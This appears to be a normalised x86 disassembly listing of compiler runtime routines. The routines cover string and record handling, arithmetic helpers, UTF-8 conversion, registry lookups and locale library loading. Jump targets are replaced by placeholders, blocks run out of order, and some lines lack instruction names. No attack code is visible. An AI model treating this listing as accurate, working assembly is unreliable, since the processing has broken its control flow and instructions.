je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_4040b8
jmp r-xdata
call sub_404094
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_40478c
jmp r-xdata
call sub_404774
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404b04
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404b1c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404ad0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4057e0
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4050d0
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402850
sub_404c2c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028f0
mov edx [ eax + esi ]
add eax ebx
call sub_4040e8
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4047b0
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404c14
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028f0
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404d48
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404c2c
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4057f8
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_40510c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402850
sub_404d48
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4040e8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4047b0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404c14
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404d48
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404c2c
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4057f8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_40510c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402850
sub_404e68
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e8c
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
xor edi 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_404f38
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404f30
jmp r-xdata
mov al 0x4
call sub_402850
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402850
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402734
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026f4
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402d44
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404b1c
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028f0
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402d44
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404f18
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404f38
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4050d0
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402714
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404b1c
sub_40510c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4050d0
pop edx
pop eax
sub_405134
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012f4
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405164
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401284
mov eax esp
mov dl 0x1
call sub_4053a0
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4051ac
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405164
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4051e8
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40128c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_401294
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4051d4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4051d4
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4051d4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_401264
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_40125c
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4053a0
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401284
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012dc
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4054a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4051e8
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012e4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012dc
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012d4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012e4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012dc
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012a4
push eax
call sub_40127c
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405620
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax [ ebx + 0x4 ]
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_405648
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_405164
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_4056a4
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_402714
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_402714
jmp r-xdata
sub_405704
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_40573f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405770
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4057d4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4057db
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4057f8
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405824
test edx edx
je sub_4057e0
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402850
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4058c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4058f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4059cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405b04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405ba3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404094
mov eax ebx
xor edx edx
call sub_4048ec
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405baa
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax ebx
call sub_4048e0
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4046e0
mov eax ebx
call sub_4048e0
push eax
mov eax [ ebp - 0x4 ]
call sub_404354
inc eax
push eax
mov eax ebx
call sub_4048d0
push eax
mov eax [ ebp - 0x4 ]
call sub_404554
pop ecx
pop edx
call sub_4058f0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404094
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4046e0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040e8
sub_405bb0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404774
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c4e
lea eax [ ebp - 0x4 ]
call sub_404774
retn
mov eax ebx
call sub_404354
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4049bc
mov eax ebx
call sub_404354
push eax
mov eax [ ebp - 0x4 ]
call sub_4048e0
inc eax
push eax
mov eax ebx
call sub_404554
push eax
mov eax [ ebp - 0x4 ]
call sub_4048d0
pop ecx
pop edx
call sub_4059cc
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404774
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4049bc
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4047b0
sub_405c54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c97
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4048c0
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405b04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c9e
lea eax [ ebp - 0x4 ]
call sub_404774
retn
sub_405ca4
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40428c
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4051ac
push eax
call sub_4012b4
mov ecx eax
mov edx esp
mov eax esi
call sub_404184
jmp r-xdata
sub_405cfc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405d62
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_40127c
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404304
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402d80
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d69
lea eax [ ebp - 0x10 ]
call sub_404094
retn
xor ebx ebx
sub_405d70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405dba
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405dc1
retn
mov eax rw-data
call sub_402ba0
mov eax rw-data
call sub_402ba0
mov eax rw-data
call sub_402ba0
call sub_401af8
sub_405dc4
sub [ rw-data ] 0x1
jae r-xdata
retn
